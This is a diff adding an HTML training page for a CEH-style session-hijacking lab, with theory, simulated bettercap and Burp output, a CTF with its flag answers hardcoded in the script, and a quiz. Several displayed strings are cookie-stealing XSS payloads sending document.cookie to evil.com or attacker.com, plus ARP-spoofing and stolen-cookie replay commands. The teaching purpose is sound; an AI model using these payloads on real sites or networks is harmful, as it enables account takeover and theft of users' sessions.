@@ -1,0 +1,536 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CEH Lab: Session Hijacking</title>
+    <style>
+        :root {
+            --primary: #00ff88;
+            --bg-dark: #0a0f1e;
+            --card-bg: #131b2f;
+            --text-light: #e0e0e0;
+            --border-glow: 0 0 15px rgba(0, 255, 136, 0.3);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            background: var(--bg-dark);
+            color: var(--text-light);
+            line-height: 1.6;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 0.5rem;
+            background: linear-gradient(135deg, #00ff88, #00b4ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        h2 {
+            color: var(--primary);
+            margin: 1.5rem 0 1rem;
+            border-bottom: 2px solid var(--primary);
+            padding-bottom: 0.5rem;
+        }
+
+        h3 {
+            color: #00b4ff;
+            margin: 1rem 0;
+        }
+
+        .grid-2 {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
+            gap: 25px;
+            margin: 20px 0;
+        }
+
+        .card {
+            background: var(--card-bg);
+            border-radius: 16px;
+            padding: 25px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(0, 255, 136, 0.1);
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        .card:hover {
+            box-shadow: var(--border-glow);
+            transform: translateY(-2px);
+        }
+
+        .toolbar {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin: 15px 0;
+        }
+
+        .btn {
+            background: #1e2a4a;
+            color: white;
+            border: 1px solid #2a3a5c;
+            padding: 10px 18px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 500;
+            transition: all 0.2s;
+        }
+
+        .btn-primary {
+            background: var(--primary);
+            color: #0a0f1e;
+            border: none;
+            font-weight: bold;
+        }
+
+        .btn-primary:hover {
+            background: #00cc6a;
+            box-shadow: 0 0 20px #00ff88;
+        }
+
+        .btn:hover {
+            background: #2a3a5c;
+        }
+
+        .terminal-box {
+            background: #0d1117;
+            border-radius: 12px;
+            padding: 15px;
+            font-family: 'Courier New', monospace;
+            border: 1px solid #30363d;
+            margin: 15px 0;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+
+        .terminal-output {
+            color: #00ff88;
+            white-space: pre-wrap;
+            margin-bottom: 10px;
+        }
+
+        .flag {
+            background: #1e2a4a;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-family: monospace;
+            color: var(--primary);
+        }
+
+        .quiz-option {
+            display: block;
+            margin: 10px 0;
+            padding: 10px;
+            background: #0d1117;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .quiz-option:hover {
+            background: #1e2a4a;
+        }
+
+        .quiz-option.correct {
+            background: #00ff8822;
+            border-left: 4px solid #00ff88;
+        }
+
+        .quiz-option.wrong {
+            background: #ff555522;
+            border-left: 4px solid #ff5555;
+        }
+
+        .progress {
+            margin: 20px 0;
+        }
+
+        .progress-bar {
+            height: 10px;
+            background: #1e2a4a;
+            border-radius: 5px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: var(--primary);
+            transition: width 0.3s;
+        }
+
+        .tab-nav {
+            display: flex;
+            border-bottom: 1px solid #2a3a5c;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+
+        .tab-btn {
+            padding: 12px 24px;
+            background: none;
+            border: none;
+            color: #8b949e;
+            cursor: pointer;
+            font-size: 1.1rem;
+            border-bottom: 2px solid transparent;
+            transition: all 0.2s;
+        }
+
+        .tab-btn.active {
+            color: var(--primary);
+            border-bottom-color: var(--primary);
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        .back-link {
+            display: inline-block;
+            margin-top: 30px;
+            color: #8b949e;
+            text-decoration: none;
+        }
+
+        .back-link:hover {
+            color: var(--primary);
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 10px 0;
+        }
+
+        th,
+        td {
+            padding: 8px;
+            text-align: left;
+            border-bottom: 1px solid #2a3a5c;
+        }
+
+        th {
+            background: #1e2a4a;
+            color: var(--primary);
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <h1>🍪 Module 11: Session Hijacking</h1>
+        <p style="font-size:1.2rem; opacity:0.9;">Steal and reuse session tokens to impersonate users.</p>
+
+        <!-- Progress Tracker -->
+        <div class="progress">
+            <span>Lab Progress: <span id="progress-text">0%</span></span>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progress-fill"></div>
+            </div>
+        </div>
+
+        <!-- Tabs -->
+        <div class="tab-nav">
+            <button class="tab-btn active" data-tab="theory" onclick="switchTab('theory')">📖 Theory & Tools</button>
+            <button class="tab-btn" data-tab="practical" onclick="switchTab('practical')">🛠️ Hands-On Attacks</button>
+            <button class="tab-btn" data-tab="challenge" onclick="switchTab('challenge')">🚩 CTF Challenge</button>
+            <button class="tab-btn" data-tab="quiz" onclick="switchTab('quiz')">📝 Self-Assessment</button>
+        </div>
+
+        <!-- ==================== THEORY TAB ==================== -->
+        <div id="theory" class="tab-content active">
+            <div class="grid-2">
+                <div class="card">
+                    <h2>🎯 Attack Vectors</h2>
+                    <ul>
+                        <li><strong>Session Sniffing:</strong> Capture unencrypted cookies (HTTP, FTP).</li>
+                        <li><strong>Cross-Site Scripting (XSS):</strong>
+                            <code>&lt;script&gt;fetch('http://evil.com?c='+document.cookie)&lt;/script&gt;</code></li>
+                        <li><strong>Session Fixation:</strong> Force user to use a known session ID.</li>
+                        <li><strong>Man-in-the-Middle (MITM):</strong> ARP spoofing + packet capture.</li>
+                    </ul>
+                </div>
+                <div class="card">
+                    <h2>🛡️ Defenses</h2>
+                    <ul>
+                        <li>Use HTTPS with HSTS.</li>
+                        <li>Set cookies: <code>HttpOnly; Secure; SameSite=Strict</code>.</li>
+                        <li>Regenerate session ID after login.</li>
+                        <li>Implement short session timeouts.</li>
+                    </ul>
+                </div>
+            </div>
+            <div class="card">
+                <h2>🧰 Key Tools</h2>
+                <table>
+                    <tr>
+                        <th>Tool</th>
+                        <th>Usage</th>
+                    </tr>
+                    <tr>
+                        <td>Wireshark / tcpdump</td>
+                        <td>Capture network traffic to extract cookies.</td>
+                    </tr>
+                    <tr>
+                        <td>Burp Suite / OWASP ZAP</td>
+                        <td>Intercept and replay HTTP requests.</td>
+                    </tr>
+                    <tr>
+                        <td>Ettercap / bettercap</td>
+                        <td>Perform ARP spoofing and MITM.</td>
+                    </tr>
+                    <tr>
+                        <td>BeEF</td>
+                        <td>Exploit XSS to hook browsers.</td>
+                    </tr>
+                </table>
+            </div>
+        </div>
+
+        <!-- ==================== PRACTICAL TAB ==================== -->
+        <div id="practical" class="tab-content">
+            <div class="card">
+                <h2>📡 Sidejacking with bettercap (Simulated)</h2>
+                <p>Perform ARP spoofing, sniff HTTP traffic, and extract a session cookie.</p>
+                <div class="toolbar">
+                    <button class="btn" onclick="updateOutput('bettercap', 'arp')">Enable ARP Spoofing</button>
+                    <button class="btn" onclick="updateOutput('bettercap', 'sniff')">Start Sniffing</button>
+                    <button class="btn" onclick="updateOutput('bettercap', 'cookie')">Show Captured Cookies</button>
+                </div>
+                <div class="terminal-box">
+                    <div class="terminal-output" id="bettercap-output">Run bettercap commands to simulate session
+                        hijacking.</div>
+                </div>
+            </div>
+
+            <div class="card">
+                <h2>🔄 Session Replay with Burp Suite (Simulated)</h2>
+                <p>Use a stolen cookie to impersonate the victim.</p>
+                <button class="btn" onclick="updateOutput('burp', 'intercept')">View Intercepted Request</button>
+                <button class="btn" onclick="updateOutput('burp', 'replay')">Replay with Stolen Cookie</button>
+                <div class="terminal-box">
+                    <div class="terminal-output" id="burp-output">Click to simulate Burp Suite session replay.</div>
+                </div>
+            </div>
+
+            <div class="card">
+                <h2>💉 XSS Cookie Theft (Simulated)</h2>
+                <p>Inject JavaScript to send the victim's cookie to a remote server.</p>
+                <button class="btn" onclick="updateOutput('xss', 'payload')">Generate XSS Payload</button>
+                <button class="btn" onclick="updateOutput('xss', 'steal')">Simulate Theft</button>
+                <div class="terminal-box">
+                    <div class="terminal-output" id="xss-output">Click to simulate XSS cookie theft.</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ==================== CTF CHALLENGE ==================== -->
+        <div id="challenge" class="tab-content">
+            <div class="card">
+                <h2>🚩 Capture The Flag: Session Hijacking</h2>
+                <p>You've captured a PCAP file and have access to a vulnerable web app. Find three flags.</p>
+
+                <div style="background:#0d1117; padding:15px; border-radius:8px; margin:15px 0;">
+                    <p><strong>Evidence:</strong></p>
+                    <ul>
+                        <li>Network capture (traffic.pcap) containing HTTP sessions</li>
+                        <li>Access to the login page (you have no credentials)</li>
+                        <li>A forum post containing a suspicious XSS payload</li>
+                    </ul>
+                </div>
+
+                <h3>🧰 Analysis Toolkit</h3>
+                <div class="toolbar">
+                    <button class="btn" onclick="updateOutput('ctf', 'pcap')">Analyze PCAP</button>
+                    <button class="btn" onclick="updateOutput('ctf', 'xss')">Examine XSS Payload</button>
+                    <button class="btn" onclick="updateOutput('ctf', 'replay')">Replay Session</button>
+                </div>
+
+                <div class="terminal-box">
+                    <div class="terminal-output" id="ctf-output">Use the tools to discover flags.</div>
+                </div>
+
+                <h3>🎯 Submit Flags</h3>
+                <div style="display:grid; gap:15px;">
+                    <div><label>Flag 1 (Sniffed Cookie):</label><input type="text" id="flag1" placeholder="FLAG{...}"
+                            style="width:100%; padding:10px; background:#010409; border:1px solid #30363d; color:#fff; border-radius:6px;">
+                    </div>
+                    <div><label>Flag 2 (XSS Vector):</label><input type="text" id="flag2" placeholder="FLAG{...}"
+                            style="width:100%; padding:10px; background:#010409; border:1px solid #30363d; color:#fff; border-radius:6px;">
+                    </div>
+                    <div><label>Flag 3 (Replayed Flag):</label><input type="text" id="flag3" placeholder="FLAG{...}"
+                            style="width:100%; padding:10px; background:#010409; border:1px solid #30363d; color:#fff; border-radius:6px;">
+                    </div>
+                </div>
+                <button class="btn btn-primary" onclick="submitFlags()">Submit All Flags</button>
+                <div id="flag-result"></div>
+            </div>
+        </div>
+
+        <!-- ==================== QUIZ ==================== -->
+        <div id="quiz" class="tab-content">
+            <div class="card">
+                <h2>📝 Check Your Understanding</h2>
+                <div id="quiz-container"></div>
+                <button class="btn btn-primary" onclick="checkQuiz()">Submit Answers</button>
+                <div id="quiz-result" style="margin-top:15px;"></div>
+            </div>
+        </div>
+
+        <a href="/module11" class="back-link">← Back to Module 11 Dashboard</a>
+    </div>
+
+    <script>
+        // Global state
+        let progress = { theory: true, practical: false, challenge: false, quiz: false };
+
+        // Predefined output data
+        const outputs = {
+            bettercap: {
+                arp: `sudo bettercap -eval "set arp.spoof.targets 192.168.1.100; arp.spoof on"\n[*] ARP spoofing enabled: poisoning 192.168.1.100.\n[+] Victim traffic now flows through attacker.`,
+                sniff: `net.sniff on\n[*] Sniffing traffic...\n[HTTP] GET /dashboard HTTP/1.1\nHost: bank.com\nCookie: PHPSESSID=abc123xyz789\n[+] Captured session cookie.`,
+                cookie: `[Captured Cookies]\nPHPSESSID=abc123xyz789 (domain: bank.com)\nJSESSIONID=node-xxxx (domain: app.local)\nFlag: FLAG{COOKIE_SNIFFED}`
+            },
+            burp: {
+                intercept: `[Burp Proxy - Intercept]\nGET /account HTTP/1.1\nHost: bank.com\nUser-Agent: Mozilla/5.0\nCookie: PHPSESSID=abc123xyz789\n\n--- Forward / Drop? ---`,
+                replay: `[Replaying request with captured cookie]\nHTTP/1.1 200 OK\nContent: Welcome, John Doe! Account Balance: $10,000\n[+] Successfully hijacked session.`
+            },
+            xss: {
+                payload: `<img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">\n[+] Payload will send victim's cookie to attacker server.`,
+                steal: `[Attacker Server Log]\nGET /steal?c=PHPSESSID=abc123xyz789\n[+] Cookie stolen from victim.`
+            },
+            ctf: {
+                pcap: `tcpdump -r traffic.pcap -A | grep "Cookie:"\nCookie: PHPSESSID=stolen123xyz\nFlag: FLAG{SNIFFED_PHPSESSID}`,
+                xss: `Forum post contains: <script>document.location='http://evil.com?c='+document.cookie</script>
+    \nAttack vector: document.location hijack. Flag: FLAG{LOCATION_HIJACK}`,
+    replay: `curl -H "Cookie: PHPSESSID=stolen123xyz" http://target.com/admin\nAdmin page: "Flag:
+    FLAG{ADMIN_SESSION_HIJACKED}"`
+    }
+    };
+
+    // Update output area
+    function updateOutput(category, action) {
+    const outputId = category + '-output';
+    const outputEl = document.getElementById(outputId);
+    if (outputEl && outputs[category] && outputs[category][action]) {
+    outputEl.textContent = outputs[category][action];
+    } else {
+    outputEl.textContent = `[${action}] Simulation complete.`;
+    }
+    // Mark practical as complete
+    if (category !== 'ctf') {
+    progress.practical = true;
+    updateProgressBar();
+    }
+    }
+
+    // Tab switching
+    function switchTab(tabId) {
+    document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+    document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
+    document.querySelector(`.tab-btn[data-tab="${tabId}"]`).classList.add('active');
+    document.getElementById(tabId).classList.add('active');
+    if (tabId === 'quiz') renderQuiz();
+    }
+
+    // Progress bar
+    function updateProgressBar() {
+    const completed = Object.values(progress).filter(v => v).length;
+    const percent = (completed / 4) * 100;
+    document.getElementById('progress-fill').style.width = percent + '%';
+    document.getElementById('progress-text').textContent = percent + '%';
+    }
+
+    // CTF Flag submission
+    function submitFlags() {
+    const f1 = document.getElementById('flag1').value.trim();
+    const f2 = document.getElementById('flag2').value.trim();
+    const f3 = document.getElementById('flag3').value.trim();
+    let correct = 0;
+    if (f1 === 'FLAG{SNIFFED_PHPSESSID}') correct++;
+    if (f2 === 'FLAG{LOCATION_HIJACK}') correct++;
+    if (f3 === 'FLAG{ADMIN_SESSION_HIJACKED}') correct++;
+
+    const res = document.getElementById('flag-result');
+    if (correct === 3) {
+    res.innerHTML = '<span style="color:#00ff88;">✅ All flags captured! You mastered session hijacking!</span>';
+    progress.challenge = true;
+    } else {
+    res.innerHTML = `<span style="color:#ff5555;">❌ ${correct}/3 correct. Keep investigating!</span>`;
+    }
+    updateProgressBar();
+    }
+
+    // Quiz
+    const quizQuestions = [
+    { q: "Which cookie flag prevents JavaScript from accessing the cookie?", opts: ["Secure", "HttpOnly", "SameSite",
+    "Domain"], ans: 1 },
+    { q: "What attack forces a user to authenticate with a known session ID?", opts: ["Session Fixation", "Session
+    Prediction", "XSS", "CSRF"], ans: 0 },
+    { q: "Which tool is used for ARP spoofing and MITM?", opts: ["Nmap", "Hydra", "Ettercap", "Nikto"], ans: 2 },
+    { q: "What is the most effective defense against session sniffing?", opts: ["Strong passwords", "HTTPS (TLS)",
+    "Firewall", "Captcha"], ans: 1 }
+    ];
+
+    function renderQuiz() {
+    let html = '';
+    quizQuestions.forEach((q, i) => {
+    html += `<div><strong>${i+1}. ${q.q}</strong><br>`;
+        q.opts.forEach((opt, j) => {
+        html += `<label class="quiz-option"><input type="radio" name="q${i}" value="${j}"> ${opt}</label>`;
+        });
+        html += '</div>';
+    });
+    document.getElementById('quiz-container').innerHTML = html;
+    }
+
+    function checkQuiz() {
+    let score = 0;
+    quizQuestions.forEach((q, i) => {
+    const sel = document.querySelector(`input[name="q${i}"]:checked`);
+    if (sel && parseInt(sel.value) === q.ans) score++;
+    });
+    const res = document.getElementById('quiz-result');
+    const pass = score >= 3;
+    res.innerHTML = `Score: ${score}/${quizQuestions.length}. ${pass ? '✅ Good job!' : '❌ Review session hijacking
+    concepts.'}`;
+    if (pass) { progress.quiz = true; updateProgressBar(); }
+    }
+
+    // Initialize
+    document.addEventListener('DOMContentLoaded', () => {
+    updateProgressBar();
+    // Set up any default outputs
+    });
+
+    // Expose functions to global scope for inline onclick
+    window.switchTab = switchTab;
+    window.updateOutput = updateOutput;
+    window.submitFlags = submitFlags;
+    window.checkQuiz = checkQuiz;
+    </script>
+</body>
+
+</html>
